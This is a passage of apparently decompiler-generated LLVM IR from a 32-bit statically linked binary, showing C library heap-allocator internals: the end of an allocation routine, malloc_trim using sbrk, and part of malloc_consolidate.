  store i32 %v2_804c9b1, i32* @global_var_80561a4.354, align 4
  %tmp20 = icmp ule i32 %v2_804c9b1, %v0_804c9a8
  %v5_804c9c3 = select i1 %tmp20, i32 %v0_804c9a8, i32 %v2_804c9b1
  store i32 %v5_804c9c3, i32* %ecx.global-to-local, align 4
  %v1_804c9c6 = load i32, i32* @global_var_80561a8.355, align 8
  %v2_804c9c6 = add i32 %v1_804c9c6, %v2_804c9b1
  store i32 %v5_804c9c3, i32* @global_var_80561b0.352, align 16
  %v1_804c9d2 = load i32, i32* @global_var_80561b4.356, align 4
  %tmp28 = icmp ule i32 %v2_804c9c6, %v1_804c9d2
  %v5_804c9d8 = select i1 %tmp28, i32 %v1_804c9d2, i32 %v2_804c9c6
  store i32 %v5_804c9d8, i32* @edx, align 4
  store i32 %v5_804c9d8, i32* @global_var_80561b4.356, align 4
  br label %dec_label_pc_804ca33

dec_label_pc_804c9e7:                             ; preds = %dec_label_pc_804c980
  %v2_804c9e7 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_804c9e7, i32* %eax.global-to-local, align 4
  %v10_804c9ea = icmp ult i32 %v1_804c7ad, %v2_804c9e7
  %v1_804c9ee = icmp eq i1 %v10_804c9ea, false
  br i1 %v1_804c9ee, label %dec_label_pc_804ca2f, label %dec_label_pc_804c9f0

dec_label_pc_804c9f0:                             ; preds = %dec_label_pc_804c9e7
  %v1_804c9f7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_804c9f7, i32* %eax.global-to-local, align 4
  store i32 %v1_804c9f7, i32* %stack_var_-60, align 4
  %v1_804c9fb = call i32 @malloc(i32 %v1_804c9f7)
  store i32 %v1_804c9fb, i32* %eax.global-to-local, align 4
  %v1_804ca03 = icmp eq i32 %v1_804c9fb, 0
  store i32 %v1_804c9fb, i32* @ebx, align 4
  br i1 %v1_804ca03, label %dec_label_pc_804ca2b, label %dec_label_pc_804ca09

dec_label_pc_804ca09:                             ; preds = %dec_label_pc_804c9f0
  %v1_804ca0e = add i32 %v1_804c7ad, -8
  store i32 %v1_804ca0e, i32* %eax.global-to-local, align 4
  store i32 %v1_804c9fb, i32* %stack_var_-60, align 4
  %v3_804ca17 = inttoptr i32 %v1_804c9fb to i16*
  %v4_804ca17 = call i32 @memcpy(i16* %v3_804ca17, i32 %tmp8, i32 %v1_804ca0e)
  store i32 %v4_804ca17, i32* %eax.global-to-local, align 4
  store i32 %v1_804c9fb, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804ca21 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_804ca26

dec_label_pc_804ca26:                             ; preds = %dec_label_pc_804c8e8, %dec_label_pc_804ca09
  %storemerge = phi i32 [ %v1_804ca21, %dec_label_pc_804ca09 ], [ %v1_804c8f2, %dec_label_pc_804c8e8 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca33

dec_label_pc_804ca2b:                             ; preds = %dec_label_pc_804c9f0, %dec_label_pc_804c84c
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ca33

dec_label_pc_804ca2f:                             ; preds = %dec_label_pc_804c9e7, %dec_label_pc_804c951, %dec_label_pc_804c7eb
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_804ca33

dec_label_pc_804ca33:                             ; preds = %dec_label_pc_804ca2b, %dec_label_pc_804ca26, %dec_label_pc_804c99a, %dec_label_pc_804c949, %dec_label_pc_804ca2f
  store i32 %v2_804c75a, i32* @eax, align 4
  store i32 %v2_804c75a, i32* %stack_var_-60, align 4
  %v2_804ca3c = call i32 @__pthread_return_void(i32 %v2_804c75a, i32 1)
  store i32 %v2_804ca3c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca41

dec_label_pc_804ca41:                             ; preds = %dec_label_pc_804c73e, %dec_label_pc_804c72a, %dec_label_pc_804ca33
  br label %dec_label_pc_804ca44

dec_label_pc_804ca44:                             ; preds = %dec_label_pc_804c778, %dec_label_pc_804ca41
  %v0_804ca47 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca47, i32* %eax.global-to-local, align 4
  store i32 %v0_804c71b, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c71a, i32* @esi, align 4
  ret i32 %v0_804ca47

; uselistorder directives
  uselistorder i32 %v1_804c9fb, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_804c9d2, { 1, 0 }
  uselistorder i32 %v2_804c9c6, { 1, 0 }
  uselistorder i32 %v2_804c9b1, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804c9a8, { 1, 0 }
  uselistorder i32 %v6_804c98d, { 1, 0, 2 }
  uselistorder i32 %v2_804c982, { 1, 0, 2 }
  uselistorder i32 %v1_804c962, { 2, 0, 1 }
  uselistorder i32 %v3_804c95e, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804c91d, { 1, 0 }
  uselistorder i32 %v1_804c883, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804c857, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_804c7fb, { 1, 0, 2 }
  uselistorder i32 %v3_804c80e, { 0, 2, 1 }
  uselistorder i32 %v2_804c7cb, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_804c7ad, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_804c7a5, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_804c79a, { 1, 0 }
  uselistorder i32 %v1_804c78a, { 1, 2, 0 }
  uselistorder i32 %v0_804c773, { 1, 0 }
  uselistorder i32 %v2_804c75a, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804ca44, { 1, 0 }
  uselistorder label %dec_label_pc_804ca41, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ca33, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804ca26, { 1, 0 }
  uselistorder label %dec_label_pc_804c949, { 1, 0 }
  uselistorder label %dec_label_pc_804c8fc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c8e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c841, { 1, 0 }
  uselistorder label %dec_label_pc_804c7a1, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804ca51 = load i32, i32* @edx, align 4
  store i32 %v0_804ca51, i32* %ebp.global-to-local, align 4
  %v0_804ca54 = load i32, i32* @esi, align 4
  %v1_804ca59 = add i32 %v0_804ca51, 860
  %v2_804ca59 = inttoptr i32 %v1_804ca59 to i32*
  %v3_804ca59 = load i32, i32* %v2_804ca59, align 4
  store i32 %v3_804ca59, i32* @ecx, align 4
  %v1_804ca5f = add i32 %v0_804ca51, 44
  %v2_804ca5f = inttoptr i32 %v1_804ca5f to i32*
  %v3_804ca5f = load i32, i32* %v2_804ca5f, align 4
  %v1_804ca62 = add i32 %v3_804ca5f, 4
  %v2_804ca62 = inttoptr i32 %v1_804ca62 to i32*
  %v3_804ca62 = load i32, i32* %v2_804ca62, align 4
  %v1_804ca65 = and i32 %v3_804ca62, -4
  store i32 %v1_804ca65, i32* @esi, align 4
  %v1_804ca6a = load i32, i32* @eax, align 4
  %v2_804ca6a = add i32 %v3_804ca59, -17
  %v2_804ca6c = add i32 %v2_804ca6a, %v1_804ca65
  %v3_804ca6c = sub i32 %v2_804ca6c, %v1_804ca6a
  %div = udiv i32 %v3_804ca6c, %v3_804ca59
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804ca6c, %v3_804ca59
  store i32 %tmp10, i32* @edx, align 4
  %v1_804ca74 = add i32 %div, -1
  %v4_804ca77 = mul i32 %v1_804ca74, %v3_804ca59
  store i32 %v4_804ca77, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804ca77, 1
  br i1 %tmp11, label %dec_label_pc_804cad3, label %dec_label_pc_804ca7e

dec_label_pc_804ca7e:                             ; preds = %entry
  %v1_804ca83 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804ca83, i32* %edi.global-to-local, align 4
  %v0_804ca8d = load i32, i32* @esi, align 4
  store i32 %v0_804ca8d, i32* %eax.global-to-local, align 4
  %v1_804ca8f = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ca8f = add i32 %v1_804ca8f, 44
  %v3_804ca8f = inttoptr i32 %v2_804ca8f to i32*
  %v4_804ca8f = load i32, i32* %v3_804ca8f, align 4
  %v5_804ca8f = add i32 %v4_804ca8f, %v0_804ca8d
  store i32 %v5_804ca8f, i32* %eax.global-to-local, align 4
  %v12_804ca92 = icmp eq i32 %v1_804ca83, %v5_804ca8f
  %v1_804ca94 = icmp eq i1 %v12_804ca92, false
  br i1 %v1_804ca94, label %dec_label_pc_804cad3, label %dec_label_pc_804ca96

dec_label_pc_804ca96:                             ; preds = %dec_label_pc_804ca7e
  %v1_804ca99 = sub i32 0, %v4_804ca77
  store i32 %v1_804ca99, i32* @ebx, align 4
  %v1_804ca9c = call i32 @__GI_sbrk(i32 %v1_804ca99)
  store i32 %v1_804ca9c, i32* %eax.global-to-local, align 4
  %v1_804caa8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804caa8, i32* %eax.global-to-local, align 4
  %v10_804cab0 = icmp eq i32 %v1_804caa8, -1
  br i1 %v10_804cab0, label %dec_label_pc_804cad3, label %dec_label_pc_804cab5

dec_label_pc_804cab5:                             ; preds = %dec_label_pc_804ca96
  %v0_804cab5 = load i32, i32* %edi.global-to-local, align 4
  %v2_804cab7 = sub i32 %v0_804cab5, %v1_804caa8
  %v12_804cab7 = icmp eq i32 %v2_804cab7, 0
  store i32 %v2_804cab7, i32* @ecx, align 4
  br i1 %v12_804cab7, label %dec_label_pc_804cad3, label %dec_label_pc_804cabb

dec_label_pc_804cabb:                             ; preds = %dec_label_pc_804cab5
  %v0_804cabb = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cabb = add i32 %v0_804cabb, 44
  %v2_804cabb = inttoptr i32 %v1_804cabb to i32*
  %v3_804cabb = load i32, i32* %v2_804cabb, align 4
  store i32 %v3_804cabb, i32* %eax.global-to-local, align 4
  %v0_804cabe = load i32, i32* @esi, align 4
  %v2_804cabe = sub i32 %v0_804cabe, %v2_804cab7
  store i32 %v2_804cabe, i32* %esi.global-to-local, align 4
  %v1_804cac0 = add i32 %v0_804cabb, 872
  %v2_804cac0 = inttoptr i32 %v1_804cac0 to i32*
  %v3_804cac0 = load i32, i32* %v2_804cac0, align 4
  %v5_804cac0 = sub i32 %v3_804cac0, %v2_804cab7
  store i32 %v5_804cac0, i32* %v2_804cac0, align 4
  %v0_804cac6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cac6 = or i32 %v0_804cac6, 1
  store i32 %v1_804cac6, i32* %esi.global-to-local, align 4
  %v1_804cac9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cac9 = add i32 %v1_804cac9, 4
  %v3_804cac9 = inttoptr i32 %v2_804cac9 to i32*
  store i32 %v1_804cac6, i32* %v3_804cac9, align 4
  br label %dec_label_pc_804cad5

dec_label_pc_804cad3:                             ; preds = %dec_label_pc_804cab5, %dec_label_pc_804ca96, %dec_label_pc_804ca7e, %entry
  br label %dec_label_pc_804cad5

dec_label_pc_804cad5:                             ; preds = %dec_label_pc_804cabb, %dec_label_pc_804cad3
  %storemerge = phi i32 [ 1, %dec_label_pc_804cabb ], [ 0, %dec_label_pc_804cad3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804ca54, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804caa8, { 1, 0, 2 }
  uselistorder i32 %v4_804ca77, { 1, 2, 0 }
  uselistorder i32 %v3_804ca59, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804ca51, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804cad5, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804cade = load i32, i32* @edi, align 4
  %v0_804cadf = load i32, i32* @esi, align 4
  %v0_804cae0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804cae8 = load i32, i32* %arg1, align 4
  store i32 %v2_804cae8, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804caef = icmp eq i32 %v2_804cae8, 0
  br i1 %v1_804caef, label %dec_label_pc_804cc18.preheader, label %dec_label_pc_804caf7

dec_label_pc_804cc18.preheader:                   ; preds = %entry
  %v3_804cc0d = add i32 %tmp11, 44
  br label %dec_label_pc_804cc09

dec_label_pc_804caf7:                             ; preds = %entry
  %v1_804cafb = and i32 %v2_804cae8, -3
  store i32 %v1_804cafb, i32* %arg1, align 4
  %v1_804cb00 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804cb0f = add i32 %tmp11, 4
  store i32 %v1_804cb0f, i32* %eax.global-to-local, align 4
  %v2_804cb16 = load i32, i32* %arg1, align 4
  %v2_804cb1c = udiv i32 %v2_804cb16, 8
  %v2_804cb1f = mul nuw i32 %v2_804cb1c, 4
  %v3_804cb1f = add i32 %tmp11, -4
  %v4_804cb1f = add i32 %v3_804cb1f, %v2_804cb1f
  store i32 %v4_804cb1f, i32* %eax.global-to-local, align 4
  %v2_804cbe6 = add i32 %tmp11, 44
  %v3_804cbe6 = inttoptr i32 %v2_804cbe6 to i32*
  %v1_804cbb9 = add i32 %tmp11, 60
  %v2_804cbb9 = inttoptr i32 %v1_804cbb9 to i32*
  br label %dec_label_pc_804cb27

dec_label_pc_804cb27:                             ; preds = %dec_label_pc_804cbff, %dec_label_pc_804caf7
  %v0_804cb35 = phi i32 [ %v1_804cb0f, %dec_label_pc_804caf7 ], [ %v4_804cbff, %dec_label_pc_804cbff ]
  store i32 %v0_804cb35, i32* %eax.global-to-local, align 4
  %v1_804cb2b = inttoptr i32 %v0_804cb35 to i32*
  %v2_804cb2b = load i32, i32* %v1_804cb2b, align 4
  store i32 %v2_804cb2b, i32* @ecx, align 4
  %v1_804cb2d = icmp eq i32 %v2_804cb2b, 0
  br i1 %v1_804cb2d, label %dec_label_pc_804cbf5, label %dec_label_pc_804cb35

dec_label_pc_804cb35:                             ; preds = %dec_label_pc_804cb27
  store i32 0, i32* %v1_804cb2b, align 4
  %v0_804cb3b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804cb3b

dec_label_pc_804cb3b:                             ; preds = %dec_label_pc_804cbe9, %dec_label_pc_804cb35
  %v0_804cb58 = phi i32 [ %v3_804cb3b, %dec_label_pc_804cbe9 ], [ %v0_804cb3b.pre, %dec_label_pc_804cb35 ]
  %v1_804cb3b = add i32 %v0_804cb58, 8
  %v2_804cb3b = inttoptr i32 %v1_804cb3b to i32*
  %v3_804cb3b = load i32, i32* %v2_804cb3b, align 4
  store i32 %v3_804cb3b, i32* %edx.global-to-local, align 4
  %v1_804cb42 = add i32 %v0_804cb58, 4
  %v2_804cb42 = inttoptr i32 %v1_804cb42 to i32*
  %v3_804cb42 = load i32, i32* %v2_804cb42, align 4
  store i32 %v3_804cb42, i32* %eax.global-to-local, align 4
  %v1_804cb47 = and i32 %v3_804cb42, -2
  store i32 %v1_804cb47, i32* @edi, align 4
  %v2_804cb4a = urem i32 %v3_804cb42, 2
  %v3_804cb4a = icmp eq i32 %v2_804cb4a, 0
  %v2_804cb4c = add i32 %v1_804cb47, %v0_804cb58
  store i32 %v2_804cb4c, i32* @ebx, align 4
  %v1_804cb4f = add i32 %v2_804cb4c, 4
  %v2_804cb4f = inttoptr i32 %v1_804cb4f to i32*
  %v3_804cb4f = load i32, i32* %v2_804cb4f, align 4
  store i32 %v3_804cb4f, i32* %edx.global-to-local, align 4
  %v1_804cb56 = icmp eq i1 %v3_804cb4a, false
  br i1 %v1_804cb56, label %dec_label_pc_804cb78, label %dec_label_pc_804cb58

dec_label_pc_804cb58:                             ; preds = %dec_label_pc_804cb3b
  %v1_804cb58 = inttoptr i32 %v0_804cb58 to i32*
  %v2_804cb58 = load i32, i32* %v1_804cb58, align 4
  store i32 %v2_804cb58, i32* %ebp.global-to-local, align 4
  %v2_804cb5c = sub i32 %v0_804cb58, %v2_804cb58
  store i32 %v2_804cb5c, i32* %eax.global-to-local, align 4
  %v1_804cb5e = add i32 %v2_804cb5c, 8
  %v2_804cb5e = inttoptr i32 %v1_804cb5e to i32*
  %v3_804cb5e = load i32, i32* %v2_804cb5e, align 4
  store i32 %v3_804cb5e, i32* @esi, align 4
  %v1_804cb61 = add i32 %v2_804cb5c, 12
  %v2_804cb61 = inttoptr i32 %v1_804cb61 to i32*
  %v3_804cb61 = load i32, i32* %v2_804cb61, align 4
  store i32 %v3_804cb61, i32* %edx.global-to-local, align 4
  %v1_804cb64 = add i32 %v3_804cb5e, 12
  %v2_804cb64 = inttoptr i32 %v1_804cb64 to i32*
  %v3_804cb64 = load i32, i32* %v2_804cb64, align 4
  store i32 %v3_804cb64, i32* @ecx, align 4
  %v12_804cb67 = icmp eq i32 %v3_804cb64, %v2_804cb5c
  %v1_804cb69 = icmp eq i1 %v12_804cb67, false
  br i1 %v1_804cb69, label %dec_label_pc_804cba8, label %dec_label_pc_804cb6b

dec_label_pc_804cb6b:                             ; preds = %dec_label_pc_804cb58
  %v1_804cb6b = add i32 %v3_804cb61, 8
  %v2_804cb6b = inttoptr i32 %v1_804cb6b to i32*
  %v3_804cb6b = load i32, i32* %v2_804cb6b, align 4
  %v15_804cb6b = icmp eq i32 %v3_804cb6b, %v3_804cb64
  %v1_804cb6e = icmp eq i1 %v15_804cb6b, false
  br i1 %v1_804cb6e, label %dec_label_pc_804cba8, label %dec_label_pc_804cb70

dec_label_pc_804cb70:                             ; preds = %dec_label_pc_804cb6b
  %v2_804cb70 = add i32 %v2_804cb58, %v1_804cb47
  store i32 %v2_804cb70, i32* @edi, align 4
  store i32 %v3_804cb61, i32* %v2_804cb64, align 4
  %v0_804cb75 = load i32, i32* @esi, align 4
  %v1_804cb75 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cb75 = add i32 %v1_804cb75, 8
  %v3_804cb75 = inttoptr i32 %v2_804cb75 to i32*
  store i32 %v0_804cb75, i32* %v3_804cb75, align 4
  %v0_804cb83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804cb78

dec_label_pc_804cb78:                             ; preds = %dec_label_pc_804cb3b, %dec_label_pc_804cb70
  %v1_804cb8c = phi i32 [ %v2_804cb4c, %dec_label_pc_804cb3b ], [ %v0_804cb83.pre, %dec_label_pc_804cb70 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804cb80 = and i32 %v3_804cb4f, -4
  store i32 %v1_804cb80, i32* %ebp.global-to-local, align 4
  %v4_804cb83 = load i32, i32* %v3_804cbe6, align 4
  %v15_804cb83 = icmp eq i32 %v1_804cb8c, %v4_804cb83
  br i1 %v15_804cb83, label %dec_label_pc_804cbd9, label %dec_label_pc_804cb88

dec_label_pc_804cb88:                             ; preds = %dec_label_pc_804cb78
  %v2_804cb88 = add i32 %v1_804cb8c, 4
  %v3_804cb88 = add i32 %v2_804cb88, %v1_804cb80
  %v4_804cb88 = inttoptr i32 %v3_804cb88 to i32*
  %v5_804cb88 = load i32, i32* %v4_804cb88, align 4
  store i32 %v5_804cb88, i32* %eax.global-to-local, align 4
  %v3_804cb8c = inttoptr i32 %v2_804cb88 to i32*
  store i32 %v1_804cb80, i32* %v3_804cb8c, align 4
  %v0_804cb8f = load i32, i32* %eax.global-to-local, align 4
  %v1_804cb8f = urem i32 %v0_804cb8f, 2
  %v2_804cb8f = icmp eq i32 %v1_804cb8f, 0
  store i32 %v1_804cb8f, i32* %eax.global-to-local, align 4
  %v1_804cb94 = icmp eq i1 %v2_804cb8f, false
  br i1 %v1_804cb94, label %dec_label_pc_804cbb5, label %dec_label_pc_804cb96

dec_label_pc_804cb96:                             ; preds = %dec_label_pc_804cb88
  %v0_804cb96 = load i32, i32* @ebx, align 4
  %v1_804cb96 = add i32 %v0_804cb96, 8
  %v2_804cb96 = inttoptr i32 %v1_804cb96 to i32*
  %v3_804cb96 = load i32, i32* %v2_804cb96, align 4
  store i32 %v3_804cb96, i32* @edx, align 4
  %v1_804cb99 = add i32 %v0_804cb96, 12
  %v2_804cb99 = inttoptr i32 %v1_804cb99 to i32*
  %v3_804cb99 = load i32, i32* %v2_804cb99, align 4
  store i32 %v3_804cb99, i32* %eax.global-to-local, align 4
  %v1_804cb9c = add i32 %v3_804cb96, 12
  %v2_804cb9c = inttoptr i32 %v1_804cb9c to i32*
  %v3_804cb9c = load i32, i32* %v2_804cb9c, align 4
  store i32 %v3_804cb9c, i32* @esi, align 4
  %v12_804cb9f = icmp eq i32 %v3_804cb9c, %v0_804cb96
  %v1_804cba1 = icmp eq i1 %v12_804cb9f, false
  br i1 %v1_804cba1, label %dec_label_pc_804cba8, label %dec_label_pc_804cba3

dec_label_pc_804cba3:                             ; preds = %dec_label_pc_804cb96
  %v1_804cba3 = add i32 %v3_804cb99, 8
  %v2_804cba3 = inttoptr i32 %v1_804cba3 to i32*
  %v3_804cba3 = load i32, i32* %v2_804cba3, align 4
  %v15_804cba3 = icmp eq i32 %v3_804cba3, %v3_804cb9c
  br i1 %v15_804cba3, label %dec_label_pc_804cbad, label %dec_label_pc_804cba8

dec_label_pc_804cba8:                             ; preds = %dec_label_pc_804cba3, %dec_label_pc_804cb96, %dec_label_pc_804cb6b, %dec_label_pc_804cb58
  %v0_804cba8 = call i32 @abort()
  store i32 %v0_804cba8, i32* %eax.global-to-local, align 4
  %v1_804cbaf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804cbad

dec_label_pc_804cbad:                             ; preds = %dec_label_pc_804cba3, %dec_label_pc_804cba8
  %v1_804cbaf = phi i32 [ %v3_804cb96, %dec_label_pc_804cba3 ], [ %v1_804cbaf.pre, %dec_label_pc_804cba8 ]
  %v0_804cbaf = phi i32 [ %v3_804cb99, %dec_label_pc_804cba3 ], [ %v0_804cba8, %dec_label_pc_804cba8 ]
  %v0_804cbad = load i32, i32* @edi, align 4
  %v1_804cbad = load i32, i32* %ebp.global-to-local, align 4
  %v2_804cbad = add i32 %v1_804cbad, %v0_804cbad
  store i32 %v2_804cbad, i32* @edi, align 4
  %v2_804cbaf = add i32 %v1_804cbaf, 12
  %v3_804cbaf = inttoptr i32 %v2_804cbaf to i32*
  store i32 %v0_804cbaf, i32* %v3_804cbaf, align 4
  %v0_804cbb2 = load i32, i32* @edx, align 4
  %v1_804cbb2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cbb2 = add i32 %v1_804cbb2, 8
  %v3_804cbb2 = inttoptr i32 %v2_804cbb2 to i32*
  store i32 %v0_804cbb2, i32* %v3_804cbb2, align 4
  br label %dec_label_pc_804cbb5

dec_label_pc_804cbb5:                             ; preds = %dec_label_pc_804cb88, %dec_label_pc_804cbad
  store i32 %v1_804cb00, i32* %eax.global-to-local, align 4
  %v3_804cbb9 = load i32, i32* %v2_804cbb9, align 4
  store i32 %v3_804cbb9, i32* @edx, align 4
  %v0_804cbbc = load i32, i32* @ecx, align 4
  store i32 %v0_804cbbc, i32* %v2_804cbb9, align 4
  %v0_804cbbf = load i32, i32* @edi, align 4
  %v1_804cbc1 = or i32 %v0_804cbbf, 1
  %v1_804cbc4 = load i32, i32* @ecx, align 4
  %v2_804cbc4 = add i32 %v1_804cbc4, 4
  %v3_804cbc4 = inttoptr i32 %v2_804cbc4 to i32*
  store i32 %v1_804cbc1, i32* %v3_804cbc4, align 4
  %v0_804cbc7 = load i32, i32* @ecx, align 4
  %v1_804cbc7 = load i32, i32* @edx, align 4
  %v2_804cbc7 = add i32 %v1_804cbc7, 12
  %v3_804cbc7 = inttoptr i32 %v2_804cbc7 to i32*
  store i32 %v0_804cbc7, i32* %v3_804cbc7, align 4
  store i32 %v1_804cb00, i32* %eax.global-to-local, align 4
  %v0_804cbce = load i32, i32* @edx, align 4
  %v1_804cbce = load i32, i32* @ecx, align 4
  %v2_804cbce = add i32 %v1_804cbce, 8
  %v3_804cbce = inttoptr i32 %v2_804cbce to i32*
  store i32 %v0_804cbce, i32* %v3_804cbce, align 4
  %v0_804cbd1 = load i32, i32* @edi, align 4
  %v1_804cbd1 = load i32, i32* @ecx, align 4
  %v3_804cbd1 = add i32 %v1_804cbd1, %v0_804cbd1
  %v4_804cbd1 = inttoptr i32 %v3_804cbd1 to i32*
  store i32 %v0_804cbd1, i32* %v4_804cbd1, align 4
  %v0_804cbd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cbd4 = load i32, i32* @ecx, align 4
  %v2_804cbd4 = add i32 %v1_804cbd4, 12
  %v3_804cbd4 = inttoptr i32 %v2_804cbd4 to i32*
  store i32 %v0_804cbd4, i32* %v3_804cbd4, align 4
  br label %dec_label_pc_804cbe9

dec_label_pc_804cbd9:                             ; preds = %dec_label_pc_804cb78
  %v0_804cbd9 = load i32, i32* @edi, align 4
  %v2_804cbd9 = add i32 %v0_804cbd9, %v1_804cb80
  %v1_804cbdc = or i32 %v2_804cbd9, 1
  store i32 %v1_804cbdc, i32* %eax.global-to-local, align 4
  %v1_804cbdf = load i32, i32* @ecx, align 4
  %v2_804cbdf = add i32 %v1_804cbdf, 4
  %v3_804cbdf = inttoptr i32 %v2_804cbdf to i32*
  store i32 %v1_804cbdc, i32* %v3_804cbdf, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804cbe6 = load i32, i32* @ecx, align 4
  store i32 %v0_804cbe6, i32* %v3_804cbe6, align 4
  br label %dec_label_pc_804cbe9

dec_label_pc_804cbe9:                             ; preds = %dec_label_pc_804cbb5, %dec_label_pc_804cbd9
  store i32 %v3_804cb3b, i32* @ecx, align 4
  %v1_804cbed = icmp eq i32 %v3_804cb3b, 0
  %v1_804cbef = icmp eq i1 %v1_804cbed, false
  br i1 %v1_804cbef, label %dec_label_pc_804cb3b, label %dec_label_pc_804cbf5

dec_label_pc_804cbf5:                             ; preds = %dec_label_pc_804cbe9, %dec_label_pc_804cb27
  store i32 %v4_804cb1f, i32* @ecx, align 4
  %v15_804cbf9 = icmp eq i32 %v0_804cb35, %v4_804cb1f
  br i1 %v15_804cbf9, label %dec_label_pc_804cc7d, label %dec_label_pc_804cbff

dec_label_pc_804cbff:                             ; preds = %dec_label_pc_804cbf5
  %v4_804cbff = add i32 %v0_804cb35, 4
  br label %dec_label_pc_804cb27

dec_label_pc_804cc09:                             ; preds = %dec_label_pc_804cc18.preheader, %dec_label_pc_804cc09
  %v1_804cc0d20 = phi i32 [ 1, %dec_label_pc_804cc18.preheader ], [ %v0_804cc18.pre, %dec_label_pc_804cc09 ]
  %v2_804cc0d = mul i32 %v1_804cc0d20, 8
  %v4_804cc0d = add i32 %v3_804cc0d, %v2_804cc0d
  store i32 %v4_804cc0d, i32* %eax.global-to-local, align 4
  %v1_804cc11 = add i32 %v1_804cc0d20, 1
  store i32 %v1_804cc11, i32* %edx.global-to-local, align 4
  %v2_804cc12 = add i32 %v4_804cc0d, 12
  %v3_804cc12 = inttoptr i32 %v2_804cc12 to i32*
  store i32 %v4_804cc0d, i32* %v3_804cc12, align 4
  %v0_804cc15 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc15 = add i32 %v0_804cc15, 8
  %v3_804cc15 = inttoptr i32 %v2_804cc15 to i32*
  store i32 %v0_804cc15, i32* %v3_804cc15, align 4
  %v0_804cc18.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804cc1b = icmp sgt i32 %v0_804cc18.pre, 95
  br i1 %v7_804cc1b, label %dec_label_pc_804cc1d, label %dec_label_pc_804cc09

dec_label_pc_804cc1d:                             ; preds = %dec_label_pc_804cc09
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804cc21 = add i32 %tmp11, 864
  %v2_804cc21 = inttoptr i32 %v1_804cc21 to i32*
  %v3_804cc21 = load i32, i32* %v2_804cc21, align 4
  %v4_804cc21 = or i32 %v3_804cc21, 1
  store i32 %v4_804cc21, i32* %v2_804cc21, align 4
  %v0_804cc28 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc28 = add i32 %v0_804cc28, 840
  %v2_804cc28 = inttoptr i32 %v1_804cc28 to i32*
